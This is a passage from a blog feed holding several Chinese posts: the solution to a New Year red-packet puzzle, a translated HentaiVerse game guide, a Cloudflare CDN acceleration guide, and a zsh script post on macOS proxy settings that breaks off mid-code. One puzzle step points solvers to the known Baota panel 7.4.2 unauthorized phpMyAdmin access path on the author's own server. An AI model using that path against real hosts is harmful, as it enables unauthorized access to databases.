25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"使用 Cloudflare 加速你的网站","date":"2020-12-15 08:19:29","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>CloudFlare 为我们提供了免费的 CDN 服务，并拥有全球各地的优秀节点，作为<strong>国外比较优秀</strong>的 CDN 服务商。</p>\n<p>但是，来自国内的访问都会被 CloudFlare 绕到大洋彼岸的美国。再加上某神秘的阻碍，导致在国内的访问一直不是很好。Ping 出延迟基本大于 &gt;= 200ms 。</p>\n<p>在一次偶然的机会中，发现：</p>\n<ul>\n<li>CloudFlare 拥有很多节点。</li>\n<li>CloudFlare 的节点之间速度非常之快。</li>\n<li>CloudFlare 的节点之间几乎没有延迟。</li>\n<li>CloudFlare 所有节点均免费，基本可以随便接入。</li>\n</ul>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%9E%E8%B7%B5\" class=\"headerlink\" title=\"实践\"></a>实践</h2>\n<p>既然发现了这个好办法，那么就开始实践吧！</p>\n<p>首先，前往「CloudFlare Partner」的站点登录。</p>\n<blockquote><p>这里要注意！CloudFlare 官方已经停止 CNAME 接入，只能前往「CloudFlare Partner」接入。</p></blockquote>\n<p>以 <a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">萌精灵 CDN</a> 为例，打开其官网：<a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">https://cdn.moeelf.com/</a> 并登录你的 CloudFlare 账号。</p>\n<p>然后点击页面右上角的「添加域名」并加你的域名接入 CloudFlare 。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/hPX5DZ.png\"><p>输入域名并点击「添加」即可添加成功。</p>\n<p>接下来点击主页列表里的「管理 DNS」进入管理界面。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/mLAxAy.png\"><p>接下来点击「添加新记录」添加一个新的记录。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/UqyfQI.png\"><img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/F0QTaI.png\"><p>然后进入你域名的 DNS 管理系统，注意是解析域名的地方。</p>\n<p>找到「CNAME 接入」处的对应 CNAME 地址，将其设为相应的解析地址。</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8A%A0%E9%80%9F%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"加速访问\"></a>加速访问</h2>\n<p>虽然默认提供给我们的节点很慢，但我们可以从 CloudFlare 公开的节点中寻找访问速度快的节点。</p>\n<p>我找到了几个国内速度不错的节点，可以参考参考：</p>\n<table>\n<thead><tr>\n<th>IP 地址</th>\n<th>运营商</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>104.27.169.248</td>\n<td>默认</td>\n</tr>\n<tr>\n<td>104.19.19.119</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>141.101.115.11</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>104.16.245.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.16.246.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.20.157.19</td>\n<td>电信</td>\n</tr>\n<tr>\n<td>141.101.114.202</td>\n<td>电信</td>\n</tr>\n</tbody>\n</table>\n<p>然后再将原来的 CNAME 记录改为 A 记录到以上 IP，再配合智能运营商解析，达到提速。</p>\n<p>如果你不想一个一个设置，可以直接将「默认」记录指向 <code>cf.record.yfun.top</code> ，节点基本都是上面的，但偶尔会改变。</p>\n<p>可能会遇到的情况：<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\">无法正常签发 SSL 证书</a></p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\" class=\"headerlink\" title=\"无法正常签发 SSL 证书？\"></a>无法正常签发 SSL 证书？</h3>\n<p>CloudFlare 默认会提供免费 SSL 证书服务，但使用「加速节点」可能导致无法正确签发。</p>\n<p>解决方法：使用智能 DNS，将「境外」的记录解析至控制面板提供给您的官方地址。</p>\n<hr>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%90%AF-SSL-%E5%90%8E%E8%AE%BF%E9%97%AE%E9%94%99%E8%AF%AF%EF%BC%9F\" class=\"headerlink\" title=\"开启 SSL 后访问错误？\"></a>开启 SSL 后访问错误？</h3>\n<p>试着为源站配置 SSL 证书，然后前往官方控制台（<a href=\"https://dash.cloudflare.com/\">https://dash.cloudflare.com</a>）将域名的 SSL 设为「完全」。</p>\n<p>注意：使用「完全」方式请务必确定源站已开启 SSL！</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%80%9F%E5%BA%A6\" class=\"headerlink\" title=\"速度\"></a>速度</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PING cf.record.yfun.top (141.101.115.11): 56 data bytes</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=0 ttl=52 time=17.007 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=1 ttl=52 time=16.363 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=2 ttl=52 time=21.385 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=3 ttl=52 time=19.305 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=4 ttl=52 time=16.341 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=5 ttl=52 time=23.181 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=6 ttl=52 time=18.888 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=7 ttl=52 time=18.087 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=8 ttl=52 time=16.153 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=9 ttl=52 time=19.363 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- cf.record.yfun.top ping statistics ---</span><br><span class=\"line\">10 packets transmitted, 10 packets received, 0.0% packet loss</span><br><span class=\"line\">round-trip min/avg/max/stddev = 16.153/18.607/23.181/2.209 ms</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/995700211/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span 